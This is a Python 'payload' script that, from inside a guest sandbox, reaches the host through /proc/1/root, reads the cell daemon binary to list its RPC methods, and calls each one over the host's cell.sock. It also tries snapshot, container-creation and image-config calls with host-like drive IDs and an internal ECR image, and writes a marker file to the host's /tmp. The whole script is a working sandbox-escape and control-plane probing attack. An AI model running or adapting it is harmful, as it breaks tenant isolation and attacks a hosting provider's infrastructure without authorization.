# -*- coding: utf-8 -*-
"""v190 payload (guest): 快照/驱动/镜像控制面深挖
1. DrivesService 方法全量 + CreateSnapshot 字段演进
2. ContainersService/Create image 参数
3. SetOCIImageConfig 字段探测
4. 宿主标记文件创建 (供用户 Remove 测试)
输出 /vercel/sandbox/v190c.out"""
import socket, time, json, os, signal, re

OUT = '/vercel/sandbox/v190c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(240)


def log(s, maxlen=4200):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def punix(sp, path, body, t=5):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sp)
        hdrs = 'POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 5000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:4000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


CELL = '/proc/1/root/run/cell/cell.sock'
DR = 'vercel.hive.cell.api.drives.v1.DrivesService'
CTRS = 'vercel.hive.cell.api.containers.v1.ContainersService'
USAGE = 'vercel.hive.cell.api.usage.v1.UsageService'

log('=== 1 DrivesService methods ===')
data = open('/proc/1/root/opt/vercel/celld', 'rb').read()
pat = re.compile(re.escape(DR.encode()) + rb'/([A-Z][A-Za-z0-9_]{1,40})')
mets = set()
for mm in pat.finditer(data):
    mets.add(mm.group(1).decode())
log('DR METHODS(%d): %s' % (len(mets), ' '.join(sorted(mets))))
# 测所有方法
for m in sorted(mets):
    st, pay = punix(CELL, '/' + DR + '/' + m, {}, t=3)
    if '404' not in st:
        log('DR %s -> %s %r' % (m, st, pay[:400]))
    time.sleep(0.05)

log('=== 2 CreateSnapshot field evolution ===')
bodies = [
    {'driveId': 'sandbox', 'bucketBaseUrl': 'http://127.0.0.1:9/x'},
    {'driveId': 'sandbox', 'bucketBaseUrl': 'http://127.0.0.1:9/x', 'snapshotId': 's1'},
    {'driveId': 'sandbox', 'bucketBaseUrl': 'http://127.0.0.1:9/x', 'snapshotId': 's1', 'description': 'd'},
    {'driveId': 'sandbox', 'bucketBaseUrl': 'http://127.0.0.1:9/', 'snapshotId': 's1'},
]
for b in bodies:
    st, pay = punix(CELL, '/' + DR + '/CreateSnapshot', b, t=4)
    log('CS %s -> %s %r' % (json.dumps(b)[:130], st, pay[:500]))
    time.sleep(0.4)

log('=== 3 driveId variants ===')
for did in ['sandbox', 'vda', 'vdb', 'host', 'root', 'main', 'system', '/dev/vda', 'sandbox-controller']:
    st, pay = punix(CELL, '/' + DR + '/CreateSnapshot', {'driveId': did, 'bucketBaseUrl': 'http://127.0.0.1:9/x'}, t=3)
    log('DV %s -> %s %r' % (did, st, pay[:300]))
    time.sleep(0.2)

log('=== 4 Create image param ===')
for b in [
    {'image': 'docker.io/library/alpine:latest'},
    {'image': '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1858be914dc973663ab50e48d0045087340cc71cf903e2841b59'},
    {'image': 'docker.io/library/alpine:latest', 'command': '/bin/sh'},
]:
    st, pay = punix(CELL, '/' + CTRS + '/Create', b, t=4)
    log('IMG %s -> %s %r' % (json.dumps(b)[:120], st, pay[:400]))
    time.sleep(0.4)

log('=== 5 SetOCIImageConfig ===')
for b in [
    {'driveId': 'sandbox', 'image': 'docker.io/library/alpine:latest'},
    {'driveId': 'sandbox', 'imageRef': 'docker.io/library/alpine:latest'},
    {'driveId': 'sandbox', 'image': '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1858be914dc973663ab50e48d0045087340cc71cf903e2841b59'},
]:
    st, pay = punix(CELL, '/' + DR + '/SetOCIImageConfig', b, t=4)
    log('OCI %s -> %s %r' % (json.dumps(b)[:120], st, pay[:400]))
    time.sleep(0.4)

log('=== 6 UsageService ===')
pat2 = re.compile(re.escape(USAGE.encode()) + rb'/([A-Z][A-Za-z0-9_]{1,40})')
mets2 = set()
for mm in pat2.finditer(data):
    mets2.add(mm.group(1).decode())
log('USAGE METHODS(%d): %s' % (len(mets2), ' '.join(sorted(mets2))))
for m in sorted(mets2):
    st, pay = punix(CELL, '/' + USAGE + '/' + m, {}, t=3)
    if '404' not in st:
        log('USAGE %s -> %s %r' % (m, st, pay[:300]))
    time.sleep(0.05)

log('=== 7 host marker for user Remove test ===')
try:
    open('/proc/1/root/tmp/v190rm.txt', 'w').write('RM190MARK')
    log('MARKER CREATED')
except Exception as e:
    log('MARKER EXC %s' % e)

log('V190_DONE')
f.close()
